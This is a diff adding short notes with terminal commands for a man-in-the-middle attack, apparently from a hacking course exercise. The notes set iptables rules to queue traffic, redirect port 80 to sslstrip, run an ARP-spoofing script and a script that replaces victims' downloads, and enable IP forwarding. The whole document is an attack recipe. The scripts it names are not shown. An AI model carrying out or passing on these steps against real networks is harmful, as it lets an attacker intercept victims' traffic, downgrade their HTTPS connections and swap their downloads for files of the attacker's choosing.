@@ -1,0 +1,31 @@
+------ ON LOCAL COMPUTER --------
+
+>iptables --flush
+---Terminal 1 ----
+> iptables -I OUTPUT -j NFQUEUE --queue-num 0
+> iptables -I INPUT -j NFQUEUE --queue-num 0
+> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+> python replace_downloads.py
+
+---Terminal 2 ----
+ > sslstrip
+
+---- Terminal 3 -----
+> iptables --flush
+> python arp_spoof.py
+
+
+
+
+---- ON ACTUAL COMPUTER--------
+
+then we need to flush the ip table with this command:
+>iptables --flush
+> iptables -I FORWARD -j NFQUEUE --queue-num 0
+
+>become the man the middle using arp_spoof.py
+
+>run replace_downloads.py file
+
+>enable ip forwarding:echo 1 > /proc/sys/net/ipv4/ip_forward 
+
